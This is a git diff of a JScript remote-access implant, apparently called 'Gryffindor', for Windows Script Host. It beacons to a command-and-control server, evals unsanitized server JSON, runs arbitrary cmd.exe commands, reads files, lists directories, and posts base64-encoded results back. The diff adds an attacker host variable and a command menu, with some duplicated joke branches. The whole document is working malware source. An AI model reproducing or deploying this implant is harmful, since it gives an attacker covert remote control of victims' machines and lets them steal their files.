@@ -1,3 +1,4 @@
+var LHOST = "192.168.86.211"
 //#######################
 //   GLOBAL VARIABLES
 //#######################
@@ -12,9 +13,10 @@ var xFrameOptions = "SAMEORIGIN";
 var contentEncoding = "gzip";
 var contentType = "text/xml";
 var agentid = Math.floor(Math.random() * 99999999).toString();
-//agentid = "24463335";
-//WScript.Echo(agentid);
-//var c2url = "http://ssppayments.com/c2.html";
+
+//Remove hardcoded vars
+agentid = "24463335";
+WScript.Echo(agentid);
 
 var target = c2url + uri;
 var initcmd = "";
@@ -111,6 +113,8 @@ function streamStringToBinary(data) {
 //#######################
 //   MAIN EXECUTION
 //#######################
+var pwd = "c:"
+
 while(true)
 {
   var b = '{"type":"b","agentid": ' + agentid +'}';
@@ -122,26 +126,135 @@ while(true)
    //if not then go direct
    //WScript.Echo(curcmd)
    //WScript.Echo(jsondata)
-  //execution
+   //execution
   try
   {
-    if (curcmd != jsondata) {
-      //Dangerous eval on unsanitized data here
+    //Dangerous eval on unsanitized data here
+    eval("jsObject="+jsondata);
+
+    //If New command
+    if (curcmd != jsObject._id) {
+
       var retval = "";
 
-      eval("jsObject="+jsondata);
-      var execStatus = objShell.Exec(jsObject.cmd);
 
-      if (execStatus.status == 2) {
-         retval = execStatus.StdErr.ReadAll();
+      //Command Selector
+      if (jsObject.cmd == "help") {
+
+        var retval = "===========================\n";
+        var retval = retval + "Gryffindor Commands:\n";
+        var retval = retval + "===========================\n";
+        var retval = retval + "help - Show this information\n";
+        var retval = retval + "pwd - Print payload working directory\n";
+        var retval = retval + "cat - Show file contents\n";
+        var retval = retval + "type - Show file contents\n";
+        var retval = retval + "cd - Change directory\n";
+        var retval = retval + "ls - Show directory contents\n";
+        var retval = retval + "dir - Show directory contents\n";
+        var retval = retval + "set - Apply payload configuration modification\n";
+        var retval = retval + "type - \n";
+        var retval = retval + "Other commands sent to Gryffindor are executed in the Windows cmd.exe shell.\n";
+        var retval = retval + "===========================\n";
+
+      } else if (jsObject.cmd == "pwd") {
+        var retval = pwd;
+      } else if (jsObject.cmd.split(" ")[0] == "cd") {
+
+        if (jsObject.cmd.split(" ")[1] == "..") {
+          depth = pwd.split("\\").length - 1
+          fso = new ActiveXObject("Scripting.FileSystemObject");
+          pwd = fso.GetParentFolderName(pwd);
+
+        } else {
+          pwd = pwd + "\\" + jsObject.cmd.slice(3);
+        }
+      } else if (jsObject.cmd.split(" ")[0] == "type" || jsObject.cmd.split(" ")[0] == "cat") {
+        //Do shell command
+        var execStatus = objShell.Exec("type " + pwd + "\\" + jsObject.cmd.split(" ")[1]);
+
+        if (execStatus.status == 2) {
+           retval = execStatus.StdErr.ReadAll();
+        } else {
+           retval = execStatus.StdOut.ReadAll();
+        }
+      } else if (jsObject.cmd.split(" ")[0] == "dir" || jsObject.cmd.split(" ")[0] == "ls") {
+        //Do shell command
+        if (jsObject.cmd.split(" ")[1]) {
+          var fso, f, fc, s;
+          fso = new ActiveXObject("Scripting.FileSystemObject");
+
+          f = fso.GetFolder(pwd + "\\" + jsObject.cmd.split(" ")[1]);
+
+          fc = new Enumerator(f.files);
+          s = "";
+          for (; !fc.atEnd(); fc.moveNext()) {
+            s += fc.item();
+            s += "\n";
+          }
+          fc = new Enumerator(f.SubFolders);
+          for (; !fc.atEnd(); fc.moveNext()) {
+            s += fc.item().path;
+            s += "\n";
+          }
+          retval = s;
+        } else {
+          var fso, f, fc, s;
+          fso = new ActiveXObject("Scripting.FileSystemObject");
+
+          f = fso.GetFolder(pwd + "\\");
+
+          fc = new Enumerator(f.files);
+          s = "";
+          for (; !fc.atEnd(); fc.moveNext()) {
+            s += fc.item();
+            s += "\n";
+          }
+          fc = new Enumerator(f.SubFolders);
+          for (; !fc.atEnd(); fc.moveNext()) {
+            s += fc.item().path;
+            s += "\n";
+          }
+          retval = s;
+        }
+      } else if (jsObject.cmd.split(" ")[0] == "set") {
+        var mod = jsObject.cmd.slice(4);
+
+        if (mod.split(" ")[0] == "interval") {
+          var beaconTime = mod.split(" ")[1]
+          retval = "Modifying implant beaconing interval to: " + mod.split(" ")[1] + "ms"
+        }
+
+      } else if (jsObject.cmd.split(" ")[0] == "show") {
+        var mod = jsObject.cmd.slice(5);
+
+        if (mod.split(" ")[0] == "settings") {
+          var retval = retval + "Interval: " + beaconTime + "\n";
+          var retval = retval + "Jitter: " + "5s \n";
+          var retval = retval + "RHOST: " + LHOST + "\n";
+          var retval = retval + "\n";
+        }
+
+      } else if (jsObject.cmd == "help") {
+        var retval = "chuck testa";
+      } else if (jsObject.cmd == "help") {
+        var retval = "chuck testa";
+      } else if (jsObject.cmd == "help") {
+        var retval = "chuck testa";
       } else {
-         retval = execStatus.StdOut.ReadAll();
+        //Do shell command
+        var execStatus = objShell.Exec(jsObject.cmd);
+
+        if (execStatus.status == 2) {
+           retval = execStatus.StdErr.ReadAll();
+        } else {
+           retval = execStatus.StdOut.ReadAll();
+        }
       }
 
       var resp = '{"type":"r","agentid": ' + agentid + ',"taskid":"1","cmd":"' + jsObject.cmd + '","retval":"' + base64Encode(retval) + '"}';
 
-      curcmd = jsondata;
-      //WScript.Echo(resp);
+      curcmd = jsObject._id;
+      WScript.Echo(resp);
       webPost(target, resp);
     }
   }
